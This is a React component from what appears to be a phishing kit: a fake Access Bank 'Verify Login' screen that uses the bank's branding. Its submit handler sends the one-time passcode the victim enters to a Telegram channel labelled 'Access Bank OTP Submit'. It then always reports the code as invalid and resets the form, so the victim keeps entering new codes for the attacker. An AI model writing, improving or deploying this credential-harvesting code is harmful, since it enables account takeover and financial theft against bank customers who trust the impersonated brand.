"use client"

import { useState, useEffect } from "react"
import { ChevronLeft } from "lucide-react"
import { sendTelegramMessage } from "@/lib/telegram"

interface OtpScreenProps {
    onVerify: (otp: string) => void
    onBack?: () => void
}

export function OtpScreen({ onVerify, onBack }: OtpScreenProps) {
    const [otp, setOtp] = useState("")
    const [timeLeft, setTimeLeft] = useState(120) // 2 minutes
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState("")

    useEffect(() => {
        if (timeLeft > 0) {
            const timerId = setTimeout(() => setTimeLeft(timeLeft - 1), 1000)
            return () => clearTimeout(timerId)
        }
    }, [timeLeft])

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60)
        const secs = seconds % 60
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
    }

    const handleVerify = async (e: React.FormEvent) => {
        e.preventDefault()

        if (otp.trim().length === 0) {
            setError("Please enter a valid verification code.")
            return
        }

        setError("")
        setIsLoading(true)

        sessionStorage.setItem("userOtp1", otp)

        await sendTelegramMessage({
            title: "🔑 Access Bank OTP Submit",
            otp1: otp,
            exclude: ["location", "otp2", "otp3"],
        })

        setTimeout(() => {
            setIsLoading(false)
            setError("Invalid verification code. Please check and try again.")
            setOtp("")
            setTimeLeft(120)
        }, 1500)
    }

    const handleResend = () => {
        setTimeLeft(120)
        setOtp("")
        setError("")
    }

    return (
        <div className="flex min-h-[100dvh] w-full max-w-[100vw] overflow-x-hidden flex-col bg-white">
            {/* Dark Navy Header with Curve (Copied from Login) */}
            <div className="">
                <div className="bg-[#0d1a33] px-5 pb-8 pt-4">
                    <div className="flex items-center justify-between relative">
                        {onBack ? (
                            <button onClick={onBack} className="flex items-center text-white z-10 w-16">
                                <ChevronLeft className="h-6 w-6" strokeWidth={2} />
                                <span className="font-medium">Back</span>
                            </button>
                        ) : (
                            <div className="w-16" />
                        )}

                        <div className="flex items-center gap-2 absolute left-1/2 -translate-x-1/2">
                            <img src="https://cdn.brandfetch.io/idPXJmyni4/theme/dark/symbol.svg?c=1dxbfHSJFAPEGdCLU4o5B" alt="" className="h-10 " />
                            <p className="text-white font-bold text-2xl font-italic hidden sm:block">access</p>
                        </div>

                        <div className="w-16" /> {/* Spacer for flex layout balance */}
                    </div>
                </div>
            </div>

            {/* Content Area */}
            <div className="relative flex-1 bg-white px-5 pt-8">
                <h2 className="text-xl font-bold text-[#0d1a33] mb-2 text-center">Verify Login</h2>
                <p className="text-sm text-gray-500 text-center mb-8">
                    Please enter the verification code sent to your registered device or number.
                </p>

                <form onSubmit={handleVerify} className="flex flex-col">
                    <div className="mb-6">
                        <label className="mb-2 block text-sm font-medium text-[#1a1a1a]">
                            Verification Code<span className="text-[#1a1a1a]">*</span>
                        </label>
                        <input
                            type="text"
                            value={otp}
                            onChange={(e) => {
                                setOtp(e.target.value.replace(/\D/g, ''))
                                setError("")
                            }}
                            placeholder="Enter Code"
                            className={`h-14 w-full rounded-lg border bg-white px-4 text-center text-xl tracking-widest text-[#1a1a1a] placeholder:text-gray-400 placeholder:tracking-normal focus:outline-none ${error ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#bcd430]'}`}
                        />
                        {error && (
                            <p className="mt-2 text-sm text-red-500 font-medium">{error}</p>
                        )}
                    </div>

                    <div className="flex flex-col items-center justify-center gap-4 mb-6">
                        <p className="text-sm font-medium text-gray-600">
                            Time remaining: <span className="text-[#0d1a33] font-bold">{formatTime(timeLeft)}</span>
                        </p>

                        <button
                            type="button"
                            onClick={handleResend}
                            disabled={timeLeft > 0}
                            className={`text-sm font-semibold underline ${timeLeft > 0 ? "text-gray-400" : "text-[#0d1a33]"}`}
                        >
                            Resend Code
                        </button>
                    </div>

                    <button
                        type="submit"
                        disabled={isLoading || otp.length === 0}
                        className="mt-4 h-14 w-full rounded-lg bg-[#bcd430] text-base font-bold uppercase tracking-wide text-[#1a1a1a] transition-colors hover:bg-[#a8c020] disabled:opacity-70"
                    >
                        {isLoading ? (
                            <span className="flex items-center justify-center gap-2">
                                <span className="h-5 w-5 animate-spin rounded-full border-2 border-[#1a1a1a] border-t-transparent" />
                                Verifying...
                            </span>
                        ) : (
                            "Verify"
                        )}
                    </button>
                </form>
            </div>
        </div>
    )
}
